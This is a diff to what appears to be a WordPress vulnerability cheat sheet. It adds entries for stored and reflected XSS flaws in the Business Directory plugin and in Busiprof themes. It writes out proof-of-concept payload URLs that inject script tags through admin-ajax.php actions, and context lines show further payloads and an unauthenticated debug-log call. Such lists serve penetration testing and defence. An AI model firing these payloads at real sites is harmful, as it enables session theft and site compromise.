@@ -148,7 +148,7 @@ Apply on: normal users or subscriber
     - < 3.1.2 - Authenticated Stored (XSS) in Column Element, Heading, Divider, Accordion, Icon Box and Image Box Widget ([exploit](https://wpscan.com/vulnerability/9647f516-b130-4cc8-85fb-2e69b034ced0))
     - < 3.4.8 - DOM Cross-Site-Scripting ([exploit](https://github.com/JawadPy/Guide/blob/main/cve/CVE-2021-24891.txt))
 - Yoast SEO 1.2.0-11.5 - Authenticated Stored XSS
-
+- Business Directory Plugin <= 5.11.1 - Authenticated Stored XSS (CVE-2021-24250)
 ## Themes
 - 15Zine < 3.3.0 - Reflected Cross-Site Scripting
     - exploit: `https://example.com/wp-admin/admin-ajax.php?action=cb_s_a&cbi=<script>alert(/XSS/);</script>`
@@ -163,3 +163,7 @@ Apply on: normal users or subscriber
 - broadcast-lite - Unauthorised AJAX Calls via Freemius (2022-02-28)
     - exploit: `https://example.com/wp-admin/admin-ajax.php?action=fs_get_debug_log`
 
+- Busiprof - Multiple Themes - Reflected Cross-Site Scripting via Customizer Notify
+    - exploit: `https://example.com/wp-admin/admin-ajax.php?action=quality_customizer_notify_dismiss_action&id=%3Cscript%3Ealert(/XSS/)%3C/script%3E`
+    - `https://example.com/wp-admin/admin-ajax.php?action=ti_customizer_notify_dismiss_recommended_plugins&id=%3Cscript%3Ealert(/XSS/)%3C/script%3E`
+- Business Directory <= 1.2.0 - Unauthenticated Reflected Cross-Site Scripting (XSS)
